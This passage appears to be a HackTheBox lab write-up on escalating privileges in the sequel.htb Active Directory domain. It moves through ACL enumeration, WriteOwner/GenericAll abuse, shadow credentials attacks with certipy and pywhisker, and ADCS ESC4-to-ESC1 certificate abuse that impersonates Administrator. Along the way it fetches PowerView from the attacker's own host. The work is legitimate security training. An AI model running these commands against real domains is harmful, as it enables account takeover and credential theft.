+<li><p><a class="reference external" href="https://devblogs.microsoft.com/powershell-community/understanding-get-acl-and-ad-drive-output/">understanding-get-acl-and-ad-drive-output</a></p></li>
+</ul>
+<p>Trying to get ryan’s ACLs manually, directly from Powershell</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Import-Module<span class="w"> </span>ActiveDirectory
+Get-Module
+Get-Command<span class="w"> </span>-Module<span class="w"> </span>ActiveDirectory
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-ADUser<span class="w"> </span>ryan
+<span class="o">(</span>Get-ADUser<span class="w"> </span>ryan<span class="o">)</span>.DistinguishedName
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-Acl<span class="w"> </span>-Path<span class="w"> </span><span class="s2">&quot;AD:\CN=ryan howard,CN=users,DC=sequel,DC=htb&quot;</span>
+<span class="o">(</span>Get-Acl<span class="w"> </span>-Path<span class="w"> </span><span class="s2">&quot;AD:\CN=ryan howard,CN=users,DC=sequel,DC=htb&quot;</span><span class="o">)</span>.Access
+</pre></div>
+</div>
+</section>
+<section id="powerview-ps1-on-windows">
+<h3>PowerView.ps1 (On Windows)<a class="headerlink" href="#powerview-ps1-on-windows" title="Permalink to this heading">#</a></h3>
+<p>Trying to get ryan’s ACLs manually, from PowerView</p>
+<p>-<a class="reference external" href="https://powersploit.readthedocs.io/en/latest/Recon/">powerview docs</a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>iwr<span class="w"> </span><span class="s2">&quot;http://10.10.16.70:9090/PowerView.ps1&quot;</span><span class="w"> </span>-o<span class="w"> </span>.<span class="se">\P</span>owerView.ps1
+Import-Module<span class="w"> </span>.<span class="se">\P</span>owerView.ps1
+Get-Module
+Get-Command<span class="w"> </span>-Module<span class="w"> </span>PowerView
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ryan
+<span class="o">(</span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ryan<span class="o">)</span>.objectsid
+<span class="o">(</span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ryan<span class="o">)</span>.distinguishedname
+<span class="o">(</span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ryan<span class="o">)</span>.samaccountname
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ca_svc
+<span class="o">(</span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ca_svc<span class="o">)</span>.objectsid
+<span class="o">(</span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ca_svc<span class="o">)</span>.distinguishedname
+<span class="o">(</span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ca_svc<span class="o">)</span>.samaccountname
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-Help<span class="w"> </span>Get-DomainObjectAcl<span class="w"> </span>-full
+Get-DomainObjectAcl<span class="w"> </span>-ResolveGUIDs<span class="w"> </span>-Identity<span class="w"> </span><span class="s2">&quot;S-1-5-21-548670397-972687484-3496335370-1114&quot;</span>
+Get-DomainObjectAcl<span class="w"> </span>-ResolveGUIDs<span class="w"> </span>-Identity<span class="w"> </span><span class="s2">&quot;CN=ryan howard,CN=users,DC=sequel,DC=htb&quot;</span>
+Get-DomainObjectAcl<span class="w"> </span>-ResolveGUIDs<span class="w"> </span>-Identity<span class="w"> </span><span class="s2">&quot;ryan&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="powerview-py-linux">
+<h3>PowerView.py (Linux)<a class="headerlink" href="#powerview-py-linux" title="Permalink to this heading">#</a></h3>
+<p>Trying to get ryan’s ACLs manually, from PowerView.py</p>
+<p>-<a class="reference external" href="https://github.com/aniqfakhrul/powerview.py">powerview.py github</a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>powerview.py<span class="w"> </span><span class="s1">&#39;sequel.htb/ryan:WqSZAxxxxxxxxxxx@10.10.11.51&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ryan
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>ca_svc
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-DomainObjectAcl<span class="w"> </span>-ResolveGUIDs<span class="w"> </span>-Identity<span class="w"> </span><span class="s2">&quot;ryan&quot;</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="abusing-ryan-s-writeowner-over-ca-svc">
+<h2>Abusing ryan’s writeOwner over ca svc<a class="headerlink" href="#abusing-ryan-s-writeowner-over-ca-svc" title="Permalink to this heading">#</a></h2>
+<p><img alt="before.png" src="../../../../_images/before.png" /></p>
+<p>Since ryan has <code class="docutils literal notranslate"><span class="pre">writeOwner</span></code> privilege over <code class="docutils literal notranslate"><span class="pre">ca_svc</span></code> we can set him as owner of <code class="docutils literal notranslate"><span class="pre">ca_svc</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-Help<span class="w"> </span>Set-DomainObjectOwner<span class="w"> </span>-full
+Set-DomainObjectOwner<span class="w"> </span>-Identity<span class="w"> </span><span class="s2">&quot;ca_svc&quot;</span><span class="w"> </span>-OwnerIdentity<span class="w"> </span><span class="s2">&quot;ryan&quot;</span>
+</pre></div>
+</div>
+<p>Now that ryan is the owner, he can grant him all rights, <code class="docutils literal notranslate"><span class="pre">GenericAll</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Get-Help<span class="w"> </span>Add-DomainObjectAcl<span class="w"> </span>-full
+Add-DomainObjectAcl<span class="w"> </span>-PrincipalIdentity<span class="w"> </span><span class="s2">&quot;ryan&quot;</span><span class="w"> </span>-TargetIdentity<span class="w"> </span><span class="s2">&quot;ca_svc&quot;</span><span class="w"> </span>-Rights<span class="w"> </span>All
+</pre></div>
+</div>
+<p>We can now re-ingest everything in bloodhound to check what we’ve just done</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodhound-python<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span>ryan<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span><span class="s1">&#39;WqSZAxxxxxxxxxxx&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-c<span class="w"> </span>All<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span>sequel.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dns-timeout<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.11.51
+</pre></div>
+</div>
+<p><img alt="after.png" src="../../../../_images/after.png" /></p>
+</section>
+<section id="genericall-change-password">
+<h2>GenericAll - Change password<a class="headerlink" href="#genericall-change-password" title="Permalink to this heading">#</a></h2>
+<p>We gave ryan GenericAll on <code class="docutils literal notranslate"><span class="pre">ca_svc</span></code> we should be able to change its password</p>
+<p>This did not work</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;ca_svc&quot;</span><span class="w"> </span><span class="s1">&#39;fluffydog17!&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-U<span class="w"> </span><span class="s2">&quot;sequel.htb&quot;</span>/<span class="s2">&quot;ryan&quot;</span>%<span class="s2">&quot;WqSZAxxxxxxxxxxx&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-S<span class="w"> </span><span class="s2">&quot;DC01.sequel.htb&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Failed</span> <span class="n">to</span> <span class="nb">set</span> <span class="n">password</span> <span class="k">for</span> <span class="s1">&#39;ca_svc&#39;</span> <span class="k">with</span> <span class="n">error</span><span class="p">:</span> <span class="n">Access</span> <span class="ow">is</span> <span class="n">denied</span><span class="o">..</span>
+</pre></div>
+</div>
+<p>But this seems to have worked</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span><span class="s2">&quot;ryan&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span><span class="s2">&quot;WqSZAxxxxxxxxxxx&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;sequel.htb&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span><span class="s2">&quot;10.10.11.51&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dns<span class="w"> </span><span class="s2">&quot;10.10.11.51&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span><span class="s2">&quot;ca_svc&quot;</span><span class="w"> </span><span class="s1">&#39;fluffydog17!&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>[+] Password changed successfully!
+</pre></div>
+</div>
+<p>I could verify with cme that smb and wmi are available to ca svc, but could not log in to either though, it looks like after a while I lost that access. Was it blocked somehow? Changing a password is actually quite noisy an likely to get reported. Maybe that’s htb trying to tell us that we shouldn’t have been lazy and should have used a shadow credentials attack. If I try to change the password again I get</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Password</span> <span class="n">can</span><span class="s1">&#39;t be changed before -2 days, 23:56:58.619569 because of the minimum password age policy.</span>
+</pre></div>
+</div>
+</section>
+<section id="genericall-shadow-credentials-with-certipy">
+<h2>GenericAll - Shadow Credentials with Certipy<a class="headerlink" href="#genericall-shadow-credentials-with-certipy" title="Permalink to this heading">#</a></h2>
+<p>Trying certipy, the first time failed, because my ACL changes have been reverted by now. So I’m redoing those steps with powerview.py this time, note that the flags differ slightly from the original powerview</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>PV<span class="w"> </span>&gt;<span class="w"> </span>Set-DomainObjectOwner<span class="w"> </span>-TargetIdentity<span class="w"> </span><span class="s2">&quot;ca_svc&quot;</span><span class="w"> </span>-PrincipalIdentity<span class="w"> </span><span class="s2">&quot;ryan&quot;</span>
+PV<span class="w"> </span>&gt;<span class="w"> </span>Add-DomainObjectAcl<span class="w"> </span>-PrincipalIdentity<span class="w"> </span><span class="s2">&quot;ryan&quot;</span><span class="w"> </span>-TargetIdentity<span class="w"> </span><span class="s2">&quot;ca_svc&quot;</span><span class="w"> </span>-Rights<span class="w"> </span>fullcontrol
+</pre></div>
+</div>
+<p>Certipy autoaticall adds a key to ca svc and then does some magic with kerberos to eventually give us the NT hash for ca svc, I need to understand what exactly this does at some point, I think a tool called whisper.exe/pywhisker.py can do that too.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certipy<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span><span class="s2">&quot;ryan@sequel.htb&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span><span class="s2">&quot;WqSZAxxxxxxxxxxx&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-account<span class="w"> </span>ca_svc<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.51
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Targeting</span> <span class="n">user</span> <span class="s1">&#39;ca_svc&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">generated</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">Key</span> <span class="n">Credential</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="n">generated</span> <span class="k">with</span> <span class="n">DeviceID</span> <span class="s1">&#39;65845dcd-e0d9-2e6f-7d21-0a53048c57de&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Adding</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="k">with</span> <span class="n">device</span> <span class="n">ID</span> <span class="s1">&#39;65845dcd-e0d9-2e6f-7d21-0a53048c57de&#39;</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="k">for</span> <span class="s1">&#39;ca_svc&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">added</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="k">with</span> <span class="n">device</span> <span class="n">ID</span> <span class="s1">&#39;65845dcd-e0d9-2e6f-7d21-0a53048c57de&#39;</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="k">for</span> <span class="s1">&#39;ca_svc&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticating</span> <span class="k">as</span> <span class="s1">&#39;ca_svc&#39;</span> <span class="k">with</span> <span class="n">the</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">ca_svc</span><span class="nd">@sequel</span><span class="o">.</span><span class="n">htb</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">&#39;ca_svc.ccache&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;ca_svc&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Restoring</span> <span class="n">the</span> <span class="n">old</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="k">for</span> <span class="s1">&#39;ca_svc&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">restored</span> <span class="n">the</span> <span class="n">old</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="k">for</span> <span class="s1">&#39;ca_svc&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;ca_svc&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="n">b18xxxxxxxxxxxxxxxxxxxxx</span>
+</pre></div>
+</div>
+</section>
+<section id="genericall-shadow-credentials-with-pywhisker">
+<h2>GenericAll - Shadow Credentials with pyWhisker<a class="headerlink" href="#genericall-shadow-credentials-with-pywhisker" title="Permalink to this heading">#</a></h2>
+<p>Trying to do that with pywhisker</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">pywhisker</span> \
+  <span class="o">--</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.51</span> \
+  <span class="o">-</span><span class="n">d</span> <span class="s2">&quot;sequel.htb&quot;</span> \
+  <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;ryan&quot;</span> \
+  <span class="o">-</span><span class="n">p</span> <span class="s2">&quot;WqSZAxxxxxxxxxxx&quot;</span> \
+  <span class="o">-</span><span class="n">t</span> <span class="s2">&quot;ca_svc&quot;</span> \
+  <span class="o">-</span><span class="n">a</span> <span class="s2">&quot;add&quot;</span> \
+  <span class="o">-</span><span class="n">f</span> <span class="n">yay</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>[!] unsupported hash type MD4
+</pre></div>
+</div>
+<p>After a bit of troubleshooting that’s a python cryptography issue, installing pycryptodom manually in the environment fixes it.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>pip<span class="w"> </span>install<span class="w"> </span>pycryptodome
+</pre></div>
+</div>
+<p>Nice, now we know 2 ways to do a shadow credentials attack, we could also do it directly from windows with the original whiskers.exe, but I’ve probably experimented enough for today.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>pywhisker<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.51<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;sequel.htb&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span><span class="s2">&quot;ryan&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span><span class="s2">&quot;WqSZAxxxxxxxxxxx&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="s2">&quot;ca_svc&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-a<span class="w"> </span><span class="s2">&quot;add&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-f<span class="w"> </span>yay
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">the</span> <span class="n">target</span> <span class="n">account</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">user</span> <span class="n">found</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Certification</span> <span class="n">Authority</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">sequel</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">generated</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">KeyCredential</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">KeyCredential</span> <span class="n">generated</span> <span class="k">with</span> <span class="n">DeviceID</span><span class="p">:</span> <span class="n">f56da038</span><span class="o">-</span><span class="mi">4</span><span class="n">be9</span><span class="o">-</span><span class="mi">488</span><span class="n">f</span><span class="o">-</span><span class="n">a230</span><span class="o">-</span><span class="mf">80e6</span><span class="n">c37ac15e</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">the</span> <span class="n">msDS</span><span class="o">-</span><span class="n">KeyCredentialLink</span> <span class="n">attribute</span> <span class="n">of</span> <span class="n">ca_svc</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Updated</span> <span class="n">the</span> <span class="n">msDS</span><span class="o">-</span><span class="n">KeyCredentialLink</span> <span class="n">attribute</span> <span class="n">of</span> <span class="n">the</span> <span class="n">target</span> <span class="nb">object</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Converting</span> <span class="n">PEM</span> <span class="o">-&gt;</span> <span class="n">PFX</span> <span class="k">with</span> <span class="n">cryptography</span><span class="p">:</span> <span class="n">yay</span><span class="o">.</span><span class="n">pfx</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PFX</span> <span class="n">exportiert</span> <span class="n">nach</span><span class="p">:</span> <span class="n">yay</span><span class="o">.</span><span class="n">pfx</span>
+<span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="n">Passwort</span> <span class="n">für</span> <span class="n">PFX</span><span class="p">:</span> <span class="n">WuzNTKHPTjt84AQq6GLq</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">PFX</span> <span class="p">(</span><span class="c1">#PKCS12) certificate &amp; key at path: yay.pfx</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Must</span> <span class="n">be</span> <span class="n">used</span> <span class="k">with</span> <span class="n">password</span><span class="p">:</span> <span class="n">WuzNTKHPTjt84AQq6GLq</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">A</span> <span class="n">TGT</span> <span class="n">can</span> <span class="n">now</span> <span class="n">be</span> <span class="n">obtained</span> <span class="k">with</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">dirkjanm</span><span class="o">/</span><span class="n">PKINITtools</span>
+</pre></div>
+</div>
+</section>
+<section id="adcs-esc4-exploitation-with-certipy">
+<h2>ADCS ESC4 exploitation with Certipy<a class="headerlink" href="#adcs-esc4-exploitation-with-certipy" title="Permalink to this heading">#</a></h2>
+<section id="find-adcs-vulnerabilities">
+<h3>Find ADCS vulnerabilities<a class="headerlink" href="#find-adcs-vulnerabilities" title="Permalink to this heading">#</a></h3>
+<p>We can now authenticate as <code class="docutils literal notranslate"><span class="pre">ca_svc</span></code> and look for vulnerabilities in the certificate authority system, note that if run without the stdout flag, certipy find dumps some files that you can injest in bloodhound.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certipy<span class="w"> </span>find<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span>ca_svc@sequel.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-hashes<span class="w"> </span>:3b18xxxxxxxxxxxxxxxxxxxxx<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-vulnerable
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for &#39;sequel-DC01-CA&#39; via CSRA
+[!] Got error while trying to get CA configuration for &#39;sequel-DC01-CA&#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for &#39;sequel-DC01-CA&#39; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for &#39;sequel-DC01-CA&#39;
+[*] Saved BloodHound data to &#39;20250316132722_Certipy.zip&#39;. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to &#39;20250316132722_Certipy.txt&#39;
+[*] Saved JSON output to &#39;20250316132722_Certipy.json&#39;
+</pre></div>
+</div>
+<p>A quick grep tells us about one of the templates being vulnerable to ESC4</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>-ri<span class="w"> </span>ESC<span class="w"> </span>20250316132722_Certipy.txt
+<span class="w">      </span>ESC4<span class="w">                              </span>:<span class="w"> </span><span class="s1">&#39;SEQUEL.HTB\\Cert Publishers&#39;</span><span class="w"> </span>has<span class="w"> </span>dangerous<span class="w"> </span>permissions
+</pre></div>
+</div>
+<p>But we might as well injest that stuff into bloodhound.</p>
+<p><a class="reference external" href="https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf">adcs-attack-paths-in-bloodhound</a></p>
+<p>ca svc is part of the cert publisher group, and the cert publisher group has GenericAll over the DunderMifflinAuthentication template,</p>
+<p><img alt="certipy.png" src="../../../../_images/certipy.png" /></p>
+<p>Which means we can modify it to make it vulnerable to ESC1. In essence that’s what ESC4 means.</p>
+<p>ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).</p>
+<p>More info about ESC4 and ESC1 from the certipy git:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4">ESC4</a></p></li>
+<li><p><a class="reference external" href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4">ESC1</a></p></li>
+</ul>
+</section>
+<section id="update-the-template">
+<h3>Update the template<a class="headerlink" href="#update-the-template" title="Permalink to this heading">#</a></h3>
+<p>We found out that the template <code class="docutils literal notranslate"><span class="pre">DunderMifflinAuthentication</span></code> is vulnerable to <code class="docutils literal notranslate"><span class="pre">ESC4</span></code>, so we can update the template to make it vulnerable to ESC1</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certipy<span class="w"> </span>template<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span>ca_svc@sequel.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-hashes<span class="w"> </span><span class="s1">&#39;3b18xxxxxxxxxxxxxxxxxxxxx&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-template<span class="w"> </span><span class="s1">&#39;DunderMifflinAuthentication&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-target<span class="w"> </span>DC01.sequel.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.129.89.45
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">certificate</span> <span class="n">template</span> <span class="s1">&#39;DunderMifflinAuthentication&#39;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">updated</span> <span class="s1">&#39;DunderMifflinAuthentication&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="issue-a-cert-with-the-updated-template">
+<h3>Issue a cert with the updated template<a class="headerlink" href="#issue-a-cert-with-the-updated-template" title="Permalink to this heading">#</a></h3>
+<p>Once the template is updated and vulnerable to ESC1 we can request a cert with that template, as Admnistrator in the upn, and we get back a pfx</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certipy<span class="w"> </span>req<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.11.51<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dns<span class="w"> </span><span class="m">10</span>.10.11.51<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.51<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-key-size<span class="w"> </span><span class="m">4096</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;ca_svc@sequel.htb&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-hashes<span class="w"> </span>:3b18xxxxxxxxxxxxxxxxxxxxx<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-ca<span class="w"> </span>sequel-DC01-CA<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-template<span class="w"> </span><span class="s1">&#39;DunderMifflinAuthentication&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-upn<span class="w"> </span>Administrator@sequel.htb
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">requested</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">8</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">multiple</span> <span class="n">identifications</span>
+    <span class="n">UPN</span><span class="p">:</span> <span class="s1">&#39;Administrator@sequel.htb&#39;</span>
+    <span class="n">DNS</span> <span class="n">Host</span> <span class="n">Name</span><span class="p">:</span> <span class="s1">&#39;10.10.11.51&#39;</span>
